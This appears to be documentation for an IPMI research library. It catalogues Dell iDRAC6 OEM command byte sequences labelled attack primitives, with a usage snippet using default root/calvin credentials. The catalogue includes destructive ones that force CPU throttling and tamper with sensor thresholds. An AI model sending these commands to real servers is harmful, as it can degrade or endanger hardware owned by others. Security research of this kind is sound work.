# Dell iDRAC6 attack primitives

Catalogue of every Dell IPMI attack byte sequence I've ingested from
prior research. Each row maps to a `zipmi.attacks.dell.AttackPrimitive`.

Usage:

```python
from zipmi.core import Session
from zipmi.attacks.dell import PROCHOT_ASSERT, PROCHOT_RELEASE, threshold_tamper

with Session(host="192.168.0.23", username="root", password="calvin") as s:
    PROCHOT_ASSERT.send(s, force=True)         # destructive: requires force
    cc, body = PROCHOT_RELEASE.send(s)         # non-destructive, no force
    p = threshold_tamper(sensor=0x0E, ucr=0xDF, unr=0xE3)
    p.send(s, force=True)
```

`AttackPrimitive.destructive=True` is gated behind `force=True` so a
casual fuzz / smoke-test sweep won't trip them.

## Catalog

| Name | NetFn / Cmd | Data | Destructive | Confirmed | Source |
|------|-------------|------|-------------|-----------|--------|
| `DellCmdThrottleCPU.read`   | `0x30 / 0xC0` | `00`     |  | ✓ | dell-prochot-throttle-attack.md |
| `DellCmdThrottleCPU.assert` | `0x30 / 0xC0` | `01 01`  | ⚠ | ✓ | dell-prochot-throttle-attack.md |
| `DellCmdThrottleCPU.release`| `0x30 / 0xC0` | `01 00`  |  | ✓ | dell-prochot-throttle-attack.md |
| `DellCmdRIPSControl.probe`  | `0x30 / 0xC2` | `00 00 00` |  |   | dell-oem-ipmi-attack-primitives.md |
| `DellCmdReadWriteLCD.demo`  | `0x30 / 0x1C` | `01 00 00 00` |  |   | dell-oem-ipmi-attack-primitives.md |
| `DellCmdReadPSUInfo.psu1`   | `0x30 / 0xB0` | `0A 01`  |  | ✓ | findings/003-dell-oem-power-commands.md |
| `DellCmdReadPSUInfo.psu2`   | `0x30 / 0xB0` | `0A 02`  |  |   | findings/003-dell-oem-power-commands.md |
| `DellCmdReadPowerBudget`    | `0x30 / 0xB3` | `0A 00`  |  | ✓ | findings/003-dell-oem-power-commands.md |
| `DellCmdReadPowerHistory`   | `0x30 / 0x9C` | `07 01`  |  | ✓ | findings/003-dell-oem-power-commands.md |
| `DellCmdReadPowerBudgetBytes` | `0x30 / 0xBB` | (empty) |  | ✓ | findings/003-dell-oem-power-commands.md |
| `GetSensorThreshold.fan_intake` | `0x04 / 0x27` | `0E` |  | ✓ | findings/005-sensor-threshold-tampering.md |

## Factories (build a primitive at call-time)

| Function | Purpose |
|----------|---------|
| `threshold_tamper(sensor, ucr, unr)` | Build a `Set Sensor Threshold` (0x04 / 0x26) primitive that overrides UCR + UNR for any sensor. **Destructive.** |
| `extended_config_get(group, idx)` | racadm-style `CmdOEMExtendedConfigure` read (0x30 / 0x27). |

## TODO

* Add WSMAN BIOS attack primitives from `dell-wsman-bios-attack.md` (BIOS
  config staging via WSMAN-over-IPMI).
* Add thermal BIOS primitives from `dell-thermal-bios-attack.md`.
* Add power-cap-attack primitives from `findings/006-power-cap-attack.md`.
* Wire into a CLI verb: `zipmi attack list` / `zipmi attack run <name>`.

Once added, regenerate this doc: `python -m zipmi.attacks.dell --markdown > docs/attacks-dell.md`.
(Currently this doc is hand-maintained — same-commit discipline still
applies; if you add an attack to `attacks/dell.py`, update this table.)
